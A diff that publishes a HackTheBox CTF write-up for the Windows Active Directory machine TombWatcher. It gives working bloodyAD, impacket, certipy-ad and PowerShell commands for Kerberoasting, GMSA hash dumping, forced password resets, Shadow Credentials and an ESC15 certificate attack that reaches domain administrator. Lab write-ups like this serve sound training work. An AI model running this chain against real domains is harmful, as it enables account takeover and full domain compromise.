@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>TombWatcher - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/TombWatcher.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for TombWatcher machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for TombWatcher machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, TombWatcher, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,164 @@
         <h1 class="writeup-title">TombWatcher</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">October 11, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="TombWatcher" src="../images/TombWatcher/pwned.png" /></p>
-<p>TombWatcher is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once TombWatcher retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/TombWatcher/pwned.png" /></p>
+<p>TombWatcher was a nice medium-difficulty Windows Active Directory box that began with credentials for user Henry, who possessed write permissions on Alfred's servicePrincipalName attribute.
+I exploited this by adding an arbitrary SPN to Alfred's account, enabling a Kerberoasting attack where I requested a TGS ticket and cracked it with hashcat to reveal Alfred's password as "basketball".</p>
+<p>BloodHound enumeration revealed a privilege escalation chain: Alfred could add himself to the Infrastructure group, which had permissions to read the GMSA password for the ansible_dev$ computer account.
+I added Alfred to Infrastructure using bloodyAD, then dumped the ansible_dev$ GMSA hash with gMSADumper.py. Using this computer account's credentials, I performed a forced password reset on the Sam user, who possessed WriteOwner privileges over John.
+I exploited this relationship through a three-step attack: setting Sam as John's owner, granting Sam FullControl via dacledit, then executing a Shadow Credentials attack with certipy-ad to obtain John's NT hash and gain WinRM access.</p>
+<p>Post-compromise enumeration as John revealed a tombstoned (deleted) Active Directory object named cert_admin within the ADCS OU. I recovered this deleted account using Restore-ADObject and changed its password via PowerShell, gaining access to an account with elevated ADCS permissions.
+Certificate enumeration with certipy-ad as cert_admin revealed a WebServer certificate template vulnerable to ESC15 (CVE-2024-49019), allowing arbitrary Application Policy injection in v1 templates.
+I exploited ESC15 by requesting a certificate for the Administrator account with the "Client Authentication" OID injected into the Application Policies extension, then used certipy-ad's LDAP shell functionality to change the Administrator password and authenticate via WinRM, achieving full domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmao" src="../images/TombWatcher/nmap.png" /></p>
+<p>Initial nmap scan reveals 13 open ports, some of them characteristic of an Active Directory DC.</p>
+<h2>Adding an SPN to Alfred</h2>
+<p>I began by looking at what permissions my user has in the domain. Without using bloodhound yet, I ran bloodyAD to see objects that are writable by Henry.</p>
+<p><code>bloodyAD -u henry -p 'H3nry_987TGV!' -d TombWatcher.htb --dc-ip 10.10.11.72 get writable --detail</code></p>
+<p><img alt="write" src="../images/TombWatcher/write.png" /></p>
+<p>Henry can write into the servicePrincipalName attribute of Alfred. This points towards a path that could allow me to get Alfred's password.</p>
+<h2>Kerberoasting the Alfred user</h2>
+<p>I can add an SPN value to Alfred's attribute using bloodyAD.</p>
+<p><code>bloodyAD -u henry -p 'H3nry_987TGV!' -d TombWatcher.htb --dc-ip 10.10.11.72 set object -v whatever/name Alfred servicePrincipalName</code></p>
+<p>The value itself does not matter here and can be set to anything. It just needs to be set in order to be considered valid for Kerberos requests.</p>
+<p><img alt="updated" src="../images/TombWatcher/updated.png" /></p>
+<p>Now I can use impacket's GetUserSPNs to seek all users with an SPN set, and request a TGS(ticket granting service) for each user found.</p>
+<p><code>impacket-GetUserSPNs -request -dc-ip 10.10.11.72 TombWatcher.htb/Henry:'H3nry_987TGV!'</code></p>
+<p><img alt="ticket" src="../images/TombWatcher/ticket.png" /></p>
+<p>After saving the ticket to a file, I'll try cracking it with hashcat.</p>
+<p><code>hashcat alfredhash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/TombWatcher/cracked.png" /></p>
+<p><code>Alfred | basketball</code></p>
+<h2>Bloodhound enumeration</h2>
+<p><img alt="bh1" src="../images/TombWatcher/bh1.png" /></p>
+<p>Alfred can add himself to the Infrastructure group.</p>
+<p><img alt="bh2" src="../images/TombWatcher/bh2.png" /></p>
+<p>Members of that group can read the GMSA password of the ansible_devs computer account.</p>
+<p><img alt="bh3" src="../images/TombWatcher/bh3.png" /></p>
+<p>That account can force a password change for the Sam user.</p>
+<p><img alt="bh4" src="../images/TombWatcher/bh4.png" /></p>
+<p>And that user has WriteOwner over John.</p>
+<p>Adding to that, John can remote into the machine, and he has GenericAll over the ADCS OU. This might become important later, so I'll keep it in mind.</p>
+<p>Now I have a clear path towards remote perms over the DC.</p>
+<h2>Taking ownership of the John user</h2>
+<h3>Reading the GMSA password of ansible_dev$</h3>
+<p>To see the GMSA passwords on the domain, I will use gMSADumper.py. When the specified user does not have permission to read GMSA passwords, the tool will list what groups have this privilege:</p>
+<p><img alt="show" src="../images/TombWatcher/show.png" /></p>
+<p>I will add Alfred to this group using bloodyAD.</p>
+<p><code>bloodyAD -d tombwatcher.htb --dc-ip 10.10.11.72 -u alfred -p basketball add groupMember infrastructure alfred</code></p>
+<p>And then rerun the previous command.</p>
+<p><img alt="hashes" src="../images/TombWatcher/hashes.png" /></p>
+<p><code>ansible_dev$ | bf8b11e301f7ba3fdc616e5d4fa01c30</code></p>
+<h3>Resetting Sam's password</h3>
+<p>We can reset Sam's password using various tools, but I'll keep using bloodyAD. However, because bloodyAD does not allow me to use hashes to authenticate, I will first request a Kerberos ticket with impacket-getTGT.</p>
+<p><code>impacket-getTGT -dc-ip 10.10.11.72 -no-pass -hashes ':bf8b11e301f7ba3fdc616e5d4fa01c30' tombwatcher.htb/'ansible_dev$</code></p>
+<p>When using Kerberos for authentication, it is good to use a FQDN<code>(Fully Qualified Domain Name = Host name + Domain name)</code> when specifying the domain controller in order to avoid <code>PRINCIPAL_UNKNOWN</code> errors.</p>
+<p><code>bloodyAD -d tombwatcher.htb --dc-ip 10.10.11.72 --host dc01.tombwatcher.htb -u 'ansible_dev' -k set password sam 'Password123!'</code></p>
+<p><img alt="change" src="../images/TombWatcher/change.png" /></p>
+<h3>Owning John</h3>
+<p>I will attack John by using the shadow credentials attack. Because I know that ADCS exists on the box, and I can grant Sam FullControl rights over John, this attack will be successful.</p>
+<p>It'll consist of 3 steps:</p>
+<ol>
+<li>
+<ul>
+<li>Set Sam as the owner of John with bloodyAD</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>Give Sam FullControl rights over John with impacket-dacledit</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>Use certipy-ad to carry out the shadow credentials attack against John, and get his NT hash</li>
+</ul>
+</li>
+</ol>
+<pre class="codehilite"><code>1 - bloodyAD -d tombwatcher.htb --dc-ip 10.10.11.72 -u sam -p 'Password123!' set owner john sam | This sets Sam as the owner of John
+
+2 - impacket-dacledit -dc-ip 10.10.11.72 -principal sam -target john -action write -rights FullControl tombwatcher.htb/sam:'Password123!' | This edits the DACL, and gives Sam FullControl over John
+
+3 - certipy-ad shadow auto -account john -dc-ip 10.10.11.72 -u sam -p 'Password123!' | And this command does the rest for me, attaches shadow credentials to John, and returns an NT hash
+</code></pre>
+
+<p><img alt="chain" src="../images/TombWatcher/chain.png" /></p>
+<p><code>John | 2b576acbe6bcfda7294d6bd18041b8fe</code></p>
+<p><img alt="user" src="../images/TombWatcher/user.png" /></p>
+<h1>Root flag</h1>
+<p>User John does not have any special permissions.</p>
+<p><img alt="nopriv" src="../images/TombWatcher/nopriv.png" /></p>
+<h2>Retrieving a tombstoned account</h2>
+<p>There are quite a few things one should take a look at with initial access to a machine. The box name made me think of "Tombstoned" objects in AD. These are objects that were deleted, but still remain within the domain. They are marked with a isDeleted=true flag, and their attributes are stripped down, creating a tombstoned object.</p>
+<p>These tombstoned objects are retained for a specified period, known as the "tombstone lifetime," which defaults to 180 days.</p>
+<p>To check for tombstoned objects, I'll use the command below.</p>
+<p><code>Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects -Properties *</code></p>
+<p><img alt="tombstoned" src="../images/TombWatcher/tombstoned.png" /></p>
+<p>There is a very interesting result in here. Cert_admin could be a deleted user account, and since it's in the ADCS OU, John should have rights over it.</p>
+<p>I'd like to recover it, and I can do so from my evil-winrm shell.</p>
+<p><code>Restore-ADObject -Identity 'CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'</code></p>
+<p><img alt="retrieved" src="../images/TombWatcher/retrieved.png" /></p>
+<p>Cert_admin has been recovered successfully. I'll rerun bloodhound-python to see its perms more clearly.</p>
+<p><img alt="certadmin" src="../images/TombWatcher/certadmin.png" /></p>
+<p>Just as expected, Hohn has GenericAll over this account. I'll change its password via powershell from my evil-winrm shell.</p>
+<p><code>Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)</code></p>
+<p>After that, I'll search for vulnerable certificate templates. The presence of this account makes me think of an ESC attack as a potential way to become administrator.</p>
+<h2>ESC15</h2>
+<p>Running certipy with user John gives nothing useful besides the CA name.</p>
+<pre class="codehilite"><code>Certificate Authorities
+  0
+    CA Name                             : tombwatcher-CA-1
+    DNS Name                            : DC01.tombwatcher.htb
+    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
+    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : TOMBWATCHER.HTB\Administrators
+      Access Rights
+        ManageCa                        : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        ManageCertificates              : TOMBWATCHER.HTB\Administrators
+                                          TOMBWATCHER.HTB\Domain Admins
+                                          TOMBWATCHER.HTB\Enterprise Admins
+        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+Certificate Templates                   : [!] Could not find any certificate templates
+</code></pre>
+
+<p>But using the cert_admin account gives a clear way towards privilege escalation.</p>
+<p><img alt="esc15" src="../images/TombWatcher/esc15.png" /></p>
+<p>This WebServer template is vulnerable to ESC 15. I can inject an OID into the Application Policies extension of the CSR. Certipy wiki explains this very well.</p>
+<p><code>https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu</code></p>
+<p>I'll request a certificate for the administrator, executing the same steps as listed in the wiki.</p>
+<p><code>certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd123!' -dc-ip '10.129.244.11' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'</code></p>
+<p><img alt="cert" src="../images/TombWatcher/cert.png" /></p>
+<p>Next, I'll authenticate with certipy using the generated certificate.</p>
+<p><img alt="nowork" src="../images/TombWatcher/nowork.png" /></p>
+<p>Or I would... But it doesn't seem to work like I expected.</p>
+<p>I'll request an ldap shell then, just like it was shown in the wiki.</p>
+<p><code>certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.244.11' -ldap-shell</code></p>
+<p><img alt="ldapshell" src="../images/TombWatcher/ldapshell.png" /></p>
+<p>Since I'm already an administrator in this shell, I can simply change the admin password to whatever I want. I can also give a user rights over the administrator account, creating a second way of changing their password.</p>
+<p>With the password changed, I can use evil-winrm to remote into the DC as the administrator.</p>
+<p><img alt="root" src="../images/TombWatcher/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
